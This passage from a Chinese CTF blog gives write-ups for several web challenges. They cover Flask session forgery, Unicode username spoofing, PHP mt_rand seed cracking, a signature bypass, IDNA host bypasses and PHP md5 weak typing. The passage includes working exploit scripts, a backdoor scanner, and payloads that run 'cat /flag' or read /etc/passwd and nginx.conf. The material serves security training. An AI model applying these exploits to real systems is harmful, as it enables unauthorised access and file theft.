session &#x3D; &#39;QlRxaRVPCx5K&#39;
txt &#x3D; str(base64.b64decode(session),&quot;Latin1&quot;)
rnd &#x3D; txt[0:4]   #拿到rnd的值
ttemp &#x3D; txt[4:]
guest &#x3D; &#39;guest&#39;
tmp &#x3D; &#39;&#39;
for i in range(len(guest)):
    tmp +&#x3D; chr(ord(guest[i]) + 10)
key &#x3D; &#39;&#39;
for i in range(len(ttemp)):
    key +&#x3D; chr(ord(tmp[i]) ^ ord(ttemp[i]))#拿到key
system &#x3D; &#39;system&#39;
system1 &#x3D; &#39;&#39;
for i in range(len(system)):
    system1 +&#x3D; chr(ord(system[i]) + 10)
md5 &#x3D; &#39;0123456789abcdef&#39;
key_new &#x3D; &#39;&#39;
cookie_new &#x3D; &#39;&#39;
for i in range(len(md5)):
    key_new  &#x3D; key + md5[i]
    session_new &#x3D; &#39;&#39;
    for j in range(len(system1)):
        session_new +&#x3D; chr(ord(key_new[j]) ^ ord(system1[j]))
    session_new &#x3D; rnd + session_new
    cookie_new &#x3D; str(base64.b64encode(session_new.encode(&#39;Latin1&#39;)),&#39;Latin1&#39;)
    print(cookie_new)</code></pre>

<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200220162317195.png" alt loading="lazy"></p>
<p>于是得到的值和php编码出来的完全一致，然后拿到bp中进行爆破拿到flag</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200220162440443.png" alt loading="lazy"></p>
<p>写脚本的水平实在是太菜了，还得多练才行</p>
<h2 id="2019强网杯—高明的黑客"><a href="#2019强网杯—高明的黑客" class="headerlink" title="2019强网杯—高明的黑客"></a>2019强网杯—高明的黑客</h2><p>核心————————–python脚本</p>
<p>界面：</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-190.png" alt loading="lazy"></p>
<p>将源码下载下来解压后发现有3000多个php文件，于是上大佬脚本：</p>
<pre class="language-python" data-language="python"><code class="language-python">import os
import requests
import re
import threading
import time
print(&#39;开始时间：  &#39;+  time.asctime( time.localtime(time.time()) ))
s1&#x3D;threading.Semaphore(100)              #这儿设置最大的线程数
filePath &#x3D; r&quot;C:&#x2F;Users&#x2F;71071&#x2F;Desktop&#x2F;src&#x2F;&quot;
os.chdir(filePath)                        #改变当前的路径
requests.adapters.DEFAULT_RETRIES &#x3D; 5    #设置重连次数，防止线程数过高，断开连接
files &#x3D; os.listdir(filePath)
session &#x3D; requests.Session()
session.keep_alive &#x3D; False                # 设置连接活跃状态为False
def get_content(file):
    s1.acquire()                                                
    print(&#39;trying   &#39;+file+ &#39;     &#39;+ time.asctime( time.localtime(time.time()) ))
    with open(file,encoding&#x3D;&#39;utf-8&#39;) as f:    #打开php文件，提取所有的$_GET和$_POST的参数
            gets &#x3D; list(re.findall(&#39;\$_GET\[\&#39;(.*?)\&#39;\]&#39;, f.read()))
            posts &#x3D; list(re.findall(&#39;\$_POST\[\&#39;(.*?)\&#39;\]&#39;, f.read()))
    data &#x3D; &#123;&#125;                            #所有的$_POST
    params &#x3D; &#123;&#125;                            #所有的$_GET
    for m in gets:
        params[m] &#x3D; &quot;echo &#39;xxxxxx&#39;;&quot;
    for n in posts:
        data[n] &#x3D; &quot;echo &#39;xxxxxx&#39;;&quot;
    url &#x3D; &#39;http:&#x2F;&#x2F;1d941413-1227-4486-890d-581a1eda8638.node3.buuoj.cn&#x2F;&#39;+file
    req &#x3D; session.post(url, data&#x3D;data, params&#x3D;params)        #一次性请求所有的GET和POST
    req.close()                            # 关闭请求  释放内存
    req.encoding &#x3D; &#39;utf-8&#39;
    content &#x3D; req.text
    #print(content)
    if &quot;xxxxxx&quot; in content:                #如果发现有可以利用的参数，继续筛选出具体的参数
        flag &#x3D; 0
        for a in gets:
            req &#x3D; session.get(url+&#39;?%s&#x3D;&#39;%a+&quot;echo &#39;xxxxxx&#39;;&quot;)
            content &#x3D; req.text
            req.close()                    # 关闭请求  释放内存
            if &quot;xxxxxx&quot; in content:
                flag &#x3D; 1
                break
        if flag !&#x3D; 1:
            for b in posts:
                req &#x3D; session.post(url, data&#x3D;&#123;b:&quot;echo &#39;xxxxxx&#39;;&quot;&#125;)
                content &#x3D; req.text
                req.close()                # 关闭请求  释放内存
                if &quot;xxxxxx&quot; in content:
                    break
        if flag &#x3D;&#x3D; 1:                   #flag用来判断参数是GET还是POST，如果是GET，flag&#x3D;&#x3D;1，则b未定义；如果是POST，flag为0，
            param &#x3D; a
        else:
            param &#x3D; b
        print(&#39;找到了利用文件： &#39;+file+&quot;  and 找到了利用的参数：%s&quot; %param)
        print(&#39;结束时间：  &#39; + time.asctime(time.localtime(time.time())))
    s1.release()

for i in files:                            #加入多线程
   t &#x3D; threading.Thread(target&#x3D;get_content, args&#x3D;(i,))
   t.start()</code></pre>


<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-191.png" alt loading="lazy"></p>
<p>访问xk0SzyKwfzw.php?Efa5BVG=cat /flag即可得到flag</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-192.png" alt loading="lazy"></p>
<h2 id="2018HCTF—admin"><a href="#2018HCTF—admin" class="headerlink" title="2018HCTF—admin"></a>2018HCTF—admin</h2><p>核心------------------------ ①flask session 伪造 ；②unicode欺骗 ，<a target="_blank" rel="noopener" href="https://www.codercto.com/a/38179.html">参考</a></p>
<p>界面：</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-183.png" alt loading="lazy"></p>
<h3 id="Flask-session-伪造"><a href="#Flask-session-伪造" class="headerlink" title="Flask session 伪造"></a>Flask session 伪造</h3><p>参考文章：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3569">Python Web之flask session&amp;格式化字符串漏洞</a></li>
<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/client-session-security.html#">客户端 session 导致的安全问题</a></li>
</ul>
<p>在index和change界面的源码处分别有两处提示：</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-184.png" alt loading="lazy"></p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-185.png" alt loading="lazy"></p>
<p>可知需要用户为admin才可以拿到flag，下载下来后发现web框架是用<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Flask/1241509?fr=aladdin">flask</a>写的</p>
<p>解题具体操作如下：</p>
<p>先注册一个账户：admin1</p>
<p>在index界面拿到自己的session，进行解码，上大佬脚本</p>
<pre class="language-python" data-language="python"><code class="language-python">import sys
import zlib
from base64 import b64decode
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode

def decryption(payload):
    payload, sig &#x3D; payload.rsplit(b&#39;.&#39;, 1)
    payload, timestamp &#x3D; payload.rsplit(b&#39;.&#39;, 1)

    decompress &#x3D; False
    if payload.startswith(b&#39;.&#39;):
        payload &#x3D; payload[1:]
        decompress &#x3D; True

    try:
        payload &#x3D; base64_decode(payload)
    except Exception as e:
        raise Exception(&#39;Could not base64 decode the payload because of &#39;
                         &#39;an exception&#39;)

    if decompress:
        try:
            payload &#x3D; zlib.decompress(payload)
        except Exception as e:
            raise Exception(&#39;Could not zlib decompress the payload before &#39;
                             &#39;decoding the payload&#39;)

    return session_json_serializer.loads(payload)

if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
    print(decryption(sys.argv[1].encode()))</code></pre>

<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-187.png" alt loading="lazy"></p>
<p>在index.html发现只要session[‘name’]==’admin’即可作为admin用户登录，再将解码出来的session中的name改为admin再进行一次编码来伪造admin的session，对session编码需要SECRET_KEY，在config.py处找到，此处用脚本编码，<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">脚本git下载地址</a></p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-188.png" alt loading="lazy"></p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-186.png" alt loading="lazy"></p>
<p>将自己的session修改为编码后的session即可得到flag</p>
<h3 id="Unicode欺骗"><a href="#Unicode欺骗" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h3><p>当解题思路断了的时候，不妨结合代码角度思考，前面在改密码界面就感觉到不对，因为密码就直接改不需要验证什么的，于是找到改密码的change函数</p>
<pre class="language-python" data-language="python"><code class="language-python">@app.route(&#39;&#x2F;change&#39;, methods &#x3D; [&#39;GET&#39;, &#39;POST&#39;])
def change():
    if not current_user.is_authenticated:
        return redirect(url_for(&#39;login&#39;))
    form &#x3D; NewpasswordForm()
    if request.method &#x3D;&#x3D; &#39;POST&#39;:
        name &#x3D; strlower(session[&#39;name&#39;])
        user &#x3D; User.query.filter_by(username&#x3D;name).first()
        user.set_password(form.newpassword.data)
        db.session.commit()
        flash(&#39;change successful&#39;)
        return redirect(url_for(&#39;index&#39;))
    return render_template(&#39;change.html&#39;, title &#x3D; &#39;change&#39;, form &#x3D; form)</code></pre>

<p>经大佬文章提点，发现在进行改密的时候使用了strlower函数将用户名转成了小写，一般在python中转小写用的都是lower函数，于是跟进strlower函数</p>
<pre class="language-python" data-language="python"><code class="language-python">def strlower(username):
    username &#x3D; nodeprep.prepare(username)
    return username</code></pre>

<p>研究nodeprep.prepare函数，nodeprep是从Twisted模块导入的，在requirements.txt文件中看到Twisted版本与最新版本相差甚远，存在猫腻，<a target="_blank" rel="noopener" href="https://panda1g1.github.io/2018/11/15/HCTF%20admin/">参考</a></p>
<p>于是就有了以下的Unicode编码问题；具体编码方式：<a target="_blank" rel="noopener" href="https://unicode-table.com/cn/search/?q=%E4%BF%AE%E9%A5%B0%E5%AD%97%E6%AF%8D%E5%A4%A7%E5%86%99">修饰字母大写</a></p>
<p>nodeprep.prepare会进行如下操作</p>
<p>ᴬ-&gt;A-&gt;a;ᴬdmin-&gt;Admin-&gt;admin</p>
<p>参考：</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/ba81f7598149fdce96a3ad74e3ab6ff1.png" alt loading="lazy"></p>
<p>注册 ᴬdmin ；登录 ᴬdmin ，经过一次strlower变成Admin，修改密码时name又经过一次strlower更改了admin的密码，随后即可以修改后的密码登录拿到flag</p>
<h2 id="安恒杯-新春祈福赛—枯燥的抽奖"><a href="#安恒杯-新春祈福赛—枯燥的抽奖" class="headerlink" title="安恒杯-新春祈福赛—枯燥的抽奖"></a>安恒杯-新春祈福赛—枯燥的抽奖</h2><p>界面：</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200202200452558.png" alt loading="lazy"></p>
<p>F12发现check.php，访问得到php源码</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
#这不是抽奖程序的源代码！不许看！
header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);
session_start();
if(!isset($_SESSION[&#39;seed&#39;]))&#123;
$_SESSION[&#39;seed&#39;]&#x3D;rand(0,999999999);
&#125;

mt_srand($_SESSION[&#39;seed&#39;]);
$str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
$str&#x3D;&#39;&#39;;
$len1&#x3D;20;
for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123;
    $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
&#125;
$str_show &#x3D; substr($str, 0, 10);
echo &quot;&lt;p id&#x3D;&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;&#x2F;p&gt;&quot;;


if(isset($_POST[&#39;num&#39;]))&#123;
    if($_POST[&#39;num&#39;]&#x3D;&#x3D;&#x3D;$str)&#123;x
        echo &quot;&lt;p id&#x3D;flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;&#x2F;p&gt;&quot;;
    &#125;
    else&#123;
        echo &quot;&lt;p id&#x3D;flag&gt;没抽中哦，再试试吧&lt;&#x2F;p&gt;&quot;;
    &#125;
&#125;
show_source(&quot;check.php&quot;);</code></pre>

<p>发现mt_srand()和mt_rand() 并且session是用随机数设置的</p>
<p>上爆破工具php_mt_seed和脚本得到随机数种子</p>
<pre class="language-python" data-language="python"><code class="language-python">str1&#x3D;&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;
str2&#x3D;&#39;cTVM5ZeUkl&#39;
length &#x3D; len(str2)
res&#x3D;&#39;&#39;
for i in range(len(str2)):
    for j in range(len(str1)):
        if str2[i] &#x3D;&#x3D; str1[j]:
            res+&#x3D;str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;
            break
print res</code></pre>

<p>得到</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">2 2 0 61 55 55 0 61 57 57 0 61 48 48 0 61 31 31 0 61 61 61 0 61 4 4 0 61 56 56 0 61 10 10 0 61 11 11 0 61</code></pre>

<p>爆破</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200202201906349.png" alt loading="lazy"></p>
<p>将得到的随机种子放到php脚本中</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
mt_srand(654818272);
$str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
$str&#x3D;&#39;&#39;;
$len1&#x3D;20;
for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123;
    $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); 
&#125;
echo $str;
?&gt;</code></pre>

<p>得到字符串</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200202202206918.png" alt loading="lazy"></p>
<h2 id="De1CTF-2019—SSRF-Me"><a href="#De1CTF-2019—SSRF-Me" class="headerlink" title="De1CTF-2019—SSRF Me"></a>De1CTF-2019—SSRF Me</h2><p>点开链接得到源码</p>
<pre class="language-python" data-language="python"><code class="language-python">#! &#x2F;usr&#x2F;bin&#x2F;env python
#encoding&#x3D;utf-8
from flask import Flask
from flask import request
import socket
import hashlib
import urllib
import sys
import os
import json
reload(sys)
sys.setdefaultencoding(&#39;latin1&#39;)

app &#x3D; Flask(__name__)

secert_key &#x3D; os.urandom(16)

class Task:
    def __init__(self, action, param, sign, ip):#python的构造方法
        self.action &#x3D; action
        self.param &#x3D; param
        self.sign &#x3D; sign
        self.sandbox &#x3D; md5(ip)
        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr
            os.mkdir(self.sandbox)

    def Exec(self):                       #定义的命令执行函数，此处调用了scan这个自定义的函数
        result &#x3D; &#123;&#125;
        result[&#39;code&#39;] &#x3D; 500
        if (self.checkSign()):
            if &quot;scan&quot; in self.action:#action要写scan
                tmpfile &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;w&#39;)
                resp &#x3D; scan(self.param)   #文件读取
                if (resp &#x3D;&#x3D; &quot;Connection Timeout&quot;):
                    result[&#39;data&#39;] &#x3D; resp
                else:
                    print resp            #输出结果
                    tmpfile.write(resp)
                    tmpfile.close()
                result[&#39;code&#39;] &#x3D; 200
            if &quot;read&quot; in self.action:#action要加read
                f &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;r&#39;)
                result[&#39;code&#39;] &#x3D; 200
                result[&#39;data&#39;] &#x3D; f.read()
            if result[&#39;code&#39;] &#x3D;&#x3D; 500:
                result[&#39;data&#39;] &#x3D; &quot;Action Error&quot;
        else:
            result[&#39;code&#39;] &#x3D; 500
            result[&#39;msg&#39;] &#x3D; &quot;Sign Error&quot;
        return result

    def checkSign(self):
        if (getSign(self.action, self.param) &#x3D;&#x3D; self.sign): #!!!校验
            return True
        else:
            return False

#generate Sign For Action Scan.
@app.route(&quot;&#x2F;geneSign&quot;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;]) #用于测试
def geneSign():
    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) 
    action &#x3D; &quot;scan&quot;
    return getSign(action, param)

@app.route(&#39;&#x2F;De1ta&#39;,methods&#x3D;[&#39;GET&#39;,&#39;POST&#39;])#实际注入
def challenge():
    action &#x3D; urllib.unquote(request.cookies.get(&quot;action&quot;))
    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
    sign &#x3D; urllib.unquote(request.cookies.get(&quot;sign&quot;))
    ip &#x3D; request.remote_addr   #获取用户ip
    if(waf(param)):
        return &quot;No Hacker!!!!&quot;
    task &#x3D; Task(action, param, sign, ip)
    return json.dumps(task.Exec())

@app.route(&#39;&#x2F;&#39;)#根目录路由
def index():
    return open(&quot;code.txt&quot;,&quot;r&quot;).read()

def scan(param):#这是用来扫目录的函数
    socket.setdefaulttimeout(1)
    try:
        return urllib.urlopen(param).read()[:50]
    except:
        return &quot;Connection Timeout&quot;

def getSign(action, param):#MD5计算,此处注意顺序先是param后是action
    return hashlib.md5(secert_key + param + action).hexdigest()

def md5(content):
    return hashlib.md5(content).hexdigest()

def waf(param):#无用的waf
    check&#x3D;param.strip().lower()
    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):
        return True
    else:
        return False

if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
    app.debug &#x3D; False
    app.run(host&#x3D;&#39;0.0.0.0&#39;)</code></pre>

<p>是一个利用flask框架搭的，有两个路由分别是<code>geneSign</code>和<code>De1ta</code></p>
<p>首先来读代码<code>geneSign</code>是用来计算传入的<code>param</code>+scan的md5值，应该是用于测试的</p>
<p><code>De1ta</code>分别可传入一个<code>get</code>参数<code>param</code>，两个<code>cookie</code>参数<code>action</code>和<code>sign</code>，并且<code>param</code>参数套了一层<code>waf</code></p>
<p>随后建立<code>Task</code>类使用<code>Exec</code>方法，在看看<code>Task</code>类是用来干什么的</p>
<p>里面可以<code>print</code>出<code>scan</code>方法后<code>param</code>的结果，根据题目提示<code>flag is in ./flag.txt</code>应该是让我们去想办法读取到flag文件然后输出</p>
<p>再看到<code>Exec</code>方法的第一个if，引用了<code>checkSign</code>方法，进行md5值的比较，这里是肯定要想办法绕过的了，问题是怎么绕？可以看到后面的if语句，如果我们想要读到<code>flag</code>，就需要让<code>action</code>中有<code>read</code>和<code>scan</code></p>
<p>再看到<code>geneSign</code>路由，里面固定死了<code>action</code>的值为<code>scan</code>，我们可以传入<code>param</code>的值来得到md5值</p>
<p>于是设想，如果<code>param</code>=<code>flag.txtread</code>，那么计算出来的md5值就是<code>flag.txtreadscan</code>的md5值，注意<code>getSign</code>方法虽然参数顺序不一样但是在函数中参数还是调了回来，我们将得到的md5赋给<code>sign</code>，再令<code>param</code>=<code>flag.txt</code>,<code>action</code>=<code>readscan</code>，那么<code>checkSign</code>不就可以返回<code>True</code>成功了比较吗，于是得到payload：</p>
<pre class="language-none"><code class="language-none">param&#x3D;flag.txt
action&#x3D;readscan;
sign&#x3D;8bdad5e249bb114a8874247817be9bad</code></pre>

<p>抓包传入即可得到flag</p>
<h1 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h1><h2 id="SUCTF-2019—Pythonginx"><a href="#SUCTF-2019—Pythonginx" class="headerlink" title="SUCTF-2019—Pythonginx"></a>SUCTF-2019—Pythonginx</h2><p>首先看到题目给出的源码：</p>
<pre class="language-python" data-language="python"><code class="language-python">@app.route(&#39;&#x2F;getUrl&#39;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])
def getUrl():
    url &#x3D; request.args.get(&quot;url&quot;)
    host &#x3D; parse.urlparse(url).hostname
    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:
        return &quot;我扌 your problem? 111&quot;
    parts &#x3D; list(urlsplit(url))
    host &#x3D; parts[1]
    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:
        return &quot;我扌 your problem? 222 &quot; + host
    newhost &#x3D; []
    for h in host.split(&#39;.&#39;):
        newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))
    parts[1] &#x3D; &#39;.&#39;.join(newhost)
    #去掉 url 中的空格
    finalUrl &#x3D; urlunsplit(parts).split(&#39; &#39;)[0]
    host &#x3D; parse.urlparse(finalUrl).hostname
    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:
        return urllib.request.urlopen(finalUrl).read()
    else:
        return &quot;我扌 your problem? 333&quot;</code></pre>

<p>我们可以传入url参数，要绕过前连两次<code>if</code>的判断也就是<code>host!=suctf.cc</code>，在最后一次要等于，就可以进行<code>urlopen(finalUrl).read()</code>文件读取的操作，推测是要我们进行文件读取</p>
<p><strong>Nginx下的重要文件位置</strong></p>
<pre class="language-none"><code class="language-none">配置文件存放目录：&#x2F;etc&#x2F;nginx
主配置文件：&#x2F;etc&#x2F;nginx&#x2F;conf&#x2F;nginx.conf
管理脚本：&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.service
模块：&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modules
应用程序：&#x2F;usr&#x2F;sbin&#x2F;nginx
程序默认存放位置：&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html
日志默认存放位置：&#x2F;var&#x2F;log&#x2F;nginx
配置文件目录为：&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</code></pre>

<p>这里就要想办法如何绕过前面的两个if，而在第三个if的时候又要判断通过，可以看到在最后一个if语句的前面有这样的一个操作：<code>newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</code>，先对里面的字符进行了<code>idna</code>编码，随后有进行了<code>utf-8</code>解码，详情<a target="_blank" rel="noopener" href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">参考</a></p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200428121257327.png" alt="image-20200428121257327" loading="lazy"></p>
<p>大概意思就是通过这样的编码就可以对传入的数据进行绕过</p>
<p>于是用脚本进行测试</p>
<pre class="language-python" data-language="python"><code class="language-python">from urllib.parse import urlparse,urlunsplit,urlsplit
from urllib import parse
def get_unicode():
    for x in range(65536):
        uni&#x3D;chr(x)
        url&#x3D;&quot;http:&#x2F;&#x2F;suctf.c&#123;&#125;&quot;.format(uni)
        try:
            if getUrl(url):
                print(&quot;str: &quot;+uni+&#39; unicode: \\u&#39;+str(hex(x))[2:])
        except:
            pass

def getUrl(url):
    url&#x3D;url
    host&#x3D;parse.urlparse(url).hostname
    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:
        return False
    parts&#x3D;list(urlsplit(url))
    host&#x3D;parts[1]
    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:
        return False
    newhost&#x3D;[]
    for h in host.split(&#39;.&#39;):
        newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))
    parts[1]&#x3D;&#39;.&#39;.join(newhost)
    finalUrl&#x3D;urlunsplit(parts).split(&#39; &#39;)[0]
    host&#x3D;parse.urlparse(finalUrl).hostname
    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:
        return True
    else:
        return False


if __name__&#x3D;&#x3D;&#39;__main__&#39;:
    get_unicode()</code></pre>

<p>得出如下结果：</p>
<pre class="language-none"><code class="language-none">str: ℂ unicode: \u2102
str: Ⅽ unicode: \u216d
str: ⅽ unicode: \u217d
str: Ⓒ unicode: \u24b8
str: ⓒ unicode: \u24d2
str: Ｃ unicode: \uff23
str: ｃ unicode: \uff43</code></pre>

<p>传入读取文件即可</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200428122756772.png" alt="image-20200428122756772" loading="lazy"></p>
<p>另外还有一种用<code>℆</code>字符进行的读法：</p>
<p><code>file://suctf.c℆sr/local/nginx/conf/nginx.conf</code>==经过编码==&gt;<code>file://suctf.cc/usr/local/nginx/conf/nginx.conf</code>，将c和u都给补全了，这样也可以读取到文件内容</p>
<p>另外这里还有个非预期解利用的是<code>CVE-2019-9636</code>，利用的是<code>urlsplit不处理NFKC标准化</code>，payload：<code>file:////suctf.cc/../../../../../etc/passwd</code>，资料较少，利用的似乎是那四个斜杠</p>
<p><code>list(urllib.parse.urlsplit(&quot;file:////suctf.cc/../../../../../etc/passwd&quot;))</code>=<code>[&#39;file&#39;, &#39;&#39;, &#39;//suctf.cc/../../../../../etc/passwd&#39;, &#39;&#39;, &#39;&#39;]</code>，这样一来第二个值就不是原来的<code>hostname</code>而是空，即可绕过前两个if判断，漏洞利用条件：</p>
<pre class="language-none"><code class="language-none">Python Python &gt;&#x3D;2.7.x，&lt;&#x3D;2.7.16
Python Python &gt;&#x3D;3.x，&lt;&#x3D;3.7.2</code></pre>

<h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>界面：</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200502184210541.png" alt loading="lazy"></p>
<p>可以看到应该是叫我们买独角兽，而且肯定是要买最贵的那个</p>
<p>首先输入<code>4</code>和<code>1337.0</code>提示<code>Only one char(?) allowed!</code>只能输入一个字符，在试一下发现报错页面代码：</p>
<pre class="language-python" data-language="python"><code class="language-python">Traceback (most recent call last):
  File &quot;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python2.7&#x2F;site-packages&#x2F;tornado&#x2F;web.py&quot;, line 1541, in _execute
    result &#x3D; method(*self.path_args, **self.path_kwargs)
  File &quot;&#x2F;app&#x2F;sshop&#x2F;views&#x2F;Shop.py&quot;, line 34, in post
    unicodedata.numeric(price)
TypeError: need a single Unicode character as parameter</code></pre>

<p>需要一个Unicode字符作为参数，再回到前面看看源码，有提示：</p>
<pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment">&lt;!--Ah,really important,seriously. --></span></code></pre>

<p>于是我们寻找到比1337大的<code>Unicode</code>字符<code>U+4E07</code>，<code>utf-8</code>编码后的16进制为<code>E4 B8 87</code>，在前面加入<code>%</code>得到<code>%E4%B8%87</code>传入即可</p>
<h1 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h1><h2 id="安恒月赛—web2-hash"><a href="#安恒月赛—web2-hash" class="headerlink" title="安恒月赛—web2_hash"></a>安恒月赛—web2_hash</h2><p>本题参考：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.gem-love.com/ctf/1799.html#web2_hash">2020二月安恒月赛抗疫练习赛web题目writeup</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4741#toc-7">2019掘安杯web7 writeup</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2232">第二届强网杯 MD5碰撞 writeup</a></p>
</blockquote>
<p>进来先看界面代码：</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
highlight_file(__FILE__);
error_reporting(0);
$val1 &#x3D; @$_GET[&#39;val1&#39;];
$val2 &#x3D; @$_GET[&#39;val2&#39;];
$val3 &#x3D; @$_GET[&#39;val3&#39;];
$val4 &#x3D; @$_GET[&#39;val4&#39;];
$val5 &#x3D; (string)@$_POST[&#39;val5&#39;];
$val6 &#x3D; (string)@$_POST[&#39;val6&#39;];
$val7 &#x3D; (string)@$_POST[&#39;val7&#39;];
if( $val1 &#x3D;&#x3D; $val2 )&#123;
    die(&#39;val1 OR val2 no no no&#39;);
&#125;
if( md5($val1) !&#x3D; md5($val2) )&#123;
    die(&#39;step 1 fail&#39;);
&#125;
if( $val3 &#x3D;&#x3D; $val4 )&#123;
    die(&#39;val3 OR val4 no no no&#39;);
&#125;
if ( md5($val3) !&#x3D;&#x3D; md5($val4))&#123;
    die(&#39;step 2 fail&#39;);
&#125;
if( $val5 &#x3D;&#x3D; $val6 || $val5 &#x3D;&#x3D; $val7 || $val6 &#x3D;&#x3D; $val7 )&#123;
    die(&#39;val5 OR val6 OR val7 no no no&#39;);
&#125;
if (md5($val5) !&#x3D;&#x3D; md5($val6) || md5($val6) !&#x3D;&#x3D; md5($val7) || md5($val5) !&#x3D;&#x3D; md5($val7))&#123;
    die(&#39;step 3 fail&#39;);
&#125;

if(!($_POST[&#39;a&#39;]) and !($_POST[&#39;b&#39;]))
&#123;
    echo &quot;come on!&quot;;
    die();
&#125;
$a &#x3D; $_POST[&#39;a&#39;];
$b &#x3D; $_POST[&#39;b&#39;];
$m &#x3D; $_GET[&#39;m&#39;];
$n &#x3D; $_GET[&#39;n&#39;];

if (!(ctype_alnum($a)) || (strlen($a) &gt; 5)  || !(ctype_alnum($b)) || (strlen($b) &gt; 6))
&#123;
    echo &quot;a OR b fail!&quot;;
    die();
&#125;

if ((strlen($m) &gt; 1) || (strlen($n) &gt; 1))
&#123;
    echo &quot;m OR n fail&quot;;
    die();
&#125;

$val8 &#x3D; md5($a);
